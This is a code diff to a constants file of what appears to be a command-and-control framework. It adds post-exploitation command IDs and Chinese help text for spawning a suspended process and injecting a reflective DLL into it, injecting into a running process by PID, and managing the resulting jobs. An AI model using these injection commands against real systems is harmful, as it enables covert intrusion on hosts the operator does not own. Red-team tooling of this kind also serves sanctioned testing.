@@ -53,6 +53,12 @@ export const COMMAND_ID = {
   CASCADE_READ: 85,
   CASCADE_DEAD: 86,
   CASCADE_PING: 87,
+
+  // Post-Ex (90, 93)
+  POSTEX: 90,
+  POSTEX_SPAWN_DLL: 90,
+  POSTEX_INJECT_DLL: 90,
+  POSTEX_EVENT: 93,
 };
 
 /**
@@ -61,6 +67,7 @@ export const COMMAND_ID = {
  */
 export const PLUGIN_COMMAND_ID = {
   EXECUTION_BOF: 70,
+  POSTEX: COMMAND_ID.POSTEX,
 };
 
 /**
@@ -245,7 +252,49 @@ export const COMMAND_HELP = {
     usage: 'help [command]',
     desc: '显示指令帮助信息',
     notes: '不带参数显示全部，带参数显示特定指令详情'
-  }
+  },
+  POSTEX_SPAWN_DLL: {
+    usage: 'postex_spawn_dll <dll_path> <wait_ms> <max_runtime_ms> <idle_timeout_ms> <description> <spawn_path> <spawn_args> [module_args]',
+    desc: '创建挂起进程并注入 reflective DLL（读取本地 DLL 文件字节发送给 Beacon）',
+    notes: [
+      'dll_path: 本地 DLL 文件路径（Client 读取文件字节后发送给 Server）。',
+      'wait_ms: 等待连接超时毫秒数，默认 3000。',
+      'max_runtime_ms: 最大运行时长，0 表示关闭。',
+      'idle_timeout_ms: 无输出空闲超时，0 表示关闭。',
+      'description: job 描述，默认 postex。',
+      'spawn_path: 目标进程路径，例如 C:\\Windows\\System32\\notepad.exe。',
+      'spawn_args: 目标进程启动参数（无参数传 ""）。',
+      'module_args: 传递给 DLL 的额外参数（可选，用引号包裹）。',
+      '示例：postex_spawn_dll "C:\\tools\\module.x64.dll" 3000 15000 0 refl-spawn "C:\\Windows\\System32\\notepad.exe" "" "--count 100 --delay 1000"'
+    ].join('\n')
+  },
+  POSTEX_INJECT_DLL: {
+    usage: 'postex_inject_dll <dll_path> <wait_ms> <max_runtime_ms> <idle_timeout_ms> <description> <pid> [module_args]',
+    desc: '注入 reflective DLL 到指定进程（读取本地 DLL 文件字节发送给 Beacon）',
+    notes: [
+      'dll_path: 本地 DLL 文件路径（Client 读取文件字节后发送给 Server）。',
+      'wait_ms: 等待连接超时毫秒数，默认 3000。',
+      'max_runtime_ms: 最大运行时长，0 表示关闭。',
+      'idle_timeout_ms: 无输出空闲超时，0 表示关闭。',
+      'description: job 描述，默认 postex。',
+      'pid: 目标进程 PID。',
+      'module_args: 传递给 DLL 的额外参数（可选，用引号包裹）。',
+      '示例：postex_inject_dll "C:\\tools\\module.x64.dll" 3000 15000 0 refl-inject 43808 "--count 100 --delay 1000"'
+    ].join('\n')
+  },
+  POSTEX_LIST: {
+    usage: 'postex_list',
+    desc: '列出当前 Beacon 的 Post-Ex job 列表（等同 jobs）',
+    notes: 'PostEx job 已接入 jobs 管理器，此命令等同 jobs。'
+  },
+  POSTEX_KILL: {
+    usage: 'postex_kill <job_id>',
+    desc: '终止指定 Post-Ex job（等同 killjob）',
+    notes: [
+      'PostEx job 已接入 jobs 管理器，此命令等同 killjob。',
+      '示例：postex_kill 123'
+    ].join('\n')
+  },
 };
 
 export const COMMAND_HELP_ALIASES = {
